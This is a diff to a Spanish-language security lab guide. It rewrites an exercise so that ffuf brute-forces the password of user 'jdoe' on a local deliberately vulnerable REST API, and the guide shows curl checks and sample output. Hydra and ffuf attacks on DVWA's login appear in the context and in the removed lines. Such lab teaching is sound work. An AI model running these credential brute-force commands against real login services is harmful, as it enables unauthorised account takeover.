@@ -169,29 +169,72 @@ hydra -l admin -P /wordlists/rockyou-subset.txt dvwa http-post-form \
 
 ---
 
-### Ejercicio 2b: Ataque Web Moderno con FFUF 🚀
+### Ejercicio 2b: Ataque Web con FFUF (API Vulnerable) 🚀
 
-Hydra es clásico, pero herramientas modernas como **FFUF** (Fuzz Faster U Fool) son más rápidas y flexibles para HTTP.
+Como DVWA tiene CSRF, usaremos la **vulnerable-api** que es una API REST sin protección CSRF.
 
 **Ventajas de FFUF**:
 - Escrito en Go (muy rápido)
-- Fácil filtrado de respuestas (por tamaño, código, palabras)
-- Más transparente con peticiones HTTP
+- Fácil filtrado por tamaño, código HTTP, o regex
+- Ideal para APIs REST
+
+#### Paso 1: Verificar la API
 
 ```bash
-# Ataque con FFUF al login de DVWA
-# -w: wordlist
-# -X POST: método
-# -d: datos (body)
-# -mr: match regex (validar éxito) o -fr (filtrar regex de fallo)
+# Ver endpoints disponibles
+curl http://vulnerable-api:5000/
 
-ffuf -w /wordlists/rockyou-subset.txt -u http://dvwa/login.php \
-     -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "username=admin&password=FUZZ&Login=Login" \
-     -fr "Login failed"
+# Probar login manualmente
+curl -X POST http://vulnerable-api:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"jdoe","password":"wrongpassword"}'
+
+# Respuesta de fallo (401): {"success":false,"error":"Invalid username or password"...}
 ```
 
-**Análisis**: FFUF probará cada palabra en `FUZZ`. La opción `-fr "Login failed"` ocultará las respuestas que contengan "Login failed", mostrando solo la correcta.
+#### Paso 2: Ataque con FFUF
+
+```bash
+# Bruteforce de password para usuario "jdoe"
+ffuf -w /wordlists/rockyou-subset.txt \
+     -u http://vulnerable-api:5000/api/login \
+     -X POST \
+     -H "Content-Type: application/json" \
+     -d '{"username":"jdoe","password":"FUZZ"}' \
+     -mc 200 \
+     -v
+
+# Explicación:
+# -mc 200: Solo mostrar respuestas con código 200 (éxito)
+# Los fallos devuelven 401, así que se filtran automáticamente
+```
+
+#### ¿Cómo saber si funcionó?
+
+FFUF mostrará una línea con la contraseña encontrada:
+
+```
+[Status: 200, Size: 150, Words: 12, Lines: 1]
+    * FUZZ: password
+```
+
+Si no aparece nada después de probar todas las palabras:
+- El usuario puede no existir en la base de datos
+- La contraseña no está en el wordlist
+
+#### Paso 3: Verificar credenciales encontradas
+
+```bash
+# Probar la contraseña encontrada
+curl -X POST http://vulnerable-api:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"jdoe","password":"password"}'
+
+# Respuesta exitosa: {"success":true,"token":"TOKEN_..."}
+```
+
+> [!TIP]
+> **Usuarios válidos en vulnerable-api**: Consulta el archivo `vulnerable-api/users_db.json` para ver qué usuarios existen y sus contraseñas (para verificar tus resultados).
 
 ---
 
